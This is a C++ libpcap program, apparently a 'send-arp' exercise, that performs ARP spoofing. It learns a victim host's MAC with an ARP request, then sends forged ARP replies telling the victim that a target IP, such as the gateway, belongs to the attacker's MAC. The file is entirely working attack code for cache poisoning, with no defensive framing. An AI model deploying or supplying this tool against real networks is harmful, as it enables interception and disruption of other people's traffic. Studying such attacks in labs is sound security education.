#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp ens33 192.168.10.2 192.168.10.1\n");
}

EthArpPacket make_request_(char * my_Mac, char * my_IP, char *sender_IP)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_Mac);//my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_Mac);//my mac
	packet.arp_.sip_ = htonl(Ip(my_IP));//target IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//sender mac
	packet.arp_.tip_ = htonl(Ip(sender_IP));//sender IP
	
	return packet;
}

char * get_my_ip_address(char * interface)
{

	struct ifreq ifr;
    static char ipstr[40];
    int fd;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
 
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("wrong socket\n");
		return 0;
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
		return ipstr;
    }
}

char * get_my_Mac_address(char * interface)
{

	struct ifreq ifr;
    static char Macstr[40];
    int fd;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family=AF_INET;
    strcpy(ifr.ifr_name, interface);
 
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        printf("wrong socket\n");
		return 0;
    } else {
		for(int i=0;i<6;i++){
		sprintf(&Macstr[3*i],"%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i]);
		if(i<5)
		{
			Macstr[3*i+2]=':';
		}
		}
		return Macstr;
    }
}

EthArpPacket make_reply_(char * sender_Mac, char * my_Mac, char * target_IP, char * sender_IP)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_Mac);//sender mac
	packet.eth_.smac_ = Mac(my_Mac);//my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_Mac);//my mac
	packet.arp_.sip_ = htonl(Ip(target_IP));//target IP
	packet.arp_.tmac_ = Mac(sender_Mac);//sender mac
	packet.arp_.tip_ = htonl(Ip(sender_IP));//sender IP
	
	return packet;
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char * my_IP = get_my_ip_address(argv[1]);
	printf("my IP Address is %s\n", my_IP);
	char * my_Mac = get_my_Mac_address(argv[1]);
	printf("my MAC Address is %s\n", my_Mac);

	int i=argc;

	char * sender_Mac;
	char * target_Mac[(i-2)/2];
	char Mac_buf1[40];
	char Mac_buf2[40];
	for(int j=0;j<(i-2)/2;j++){
		char * sender_IP=argv[2*j+2];
		char * target_IP=argv[2*j+3];

		EthArpPacket packet1;
	    //EthArpPacket make_request_(char * my_Mac, char * my_IP, char *sender_IP)
		packet1=make_request_(my_Mac,my_IP,sender_IP);

		int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
		if (res1 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
		}//arp request packet send

		EthArpPacket *arp_reply;
		
		while (true) {

	        struct pcap_pkthdr* header;
	        const u_char* packet;
	        int res = pcap_next_ex(handle, &header, &packet);
	        if (res == 0) continue;
	        if (res == -1 || res == -2) {
	            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
	            break;
	        }
			arp_reply=(struct EthArpPacket*)packet;


				if(arp_reply->eth_.type_ == htons(EthHdr::Arp)&&arp_reply->arp_.tmac_ == packet1.arp_.smac_
				&&arp_reply->arp_.op_ == htons(ArpHdr::Reply)&&arp_reply->arp_.op_ == htons(ArpHdr::Reply))
				{memcpy(Mac_buf1,arp_reply->arp_.smac_,6);
				for(int k=0;k<6;k++){
					sprintf(&Mac_buf2[3*k],"%02x",(unsigned char)Mac_buf1[k]);
					if(k<5)
					{
						Mac_buf2[3*k+2]=':';
					}
				}				
				sender_Mac=Mac_buf2;
				printf("IP=%s Mac=%s\n",sender_IP,sender_Mac);
				break;}

				
				
	    }
	
				
		EthArpPacket packet2;
	    //EthArpPacket make_reply_(char * sender_Mac, char * my_Mac, char * target_IP, char * sender_IP)
		packet2=make_reply_(sender_Mac,my_Mac,target_IP,sender_IP);

		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
		if (res2 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
		}//arp reply packet send
		printf("send reply packet to %s\n",sender_IP);

	}//for end
	pcap_close(handle);
}
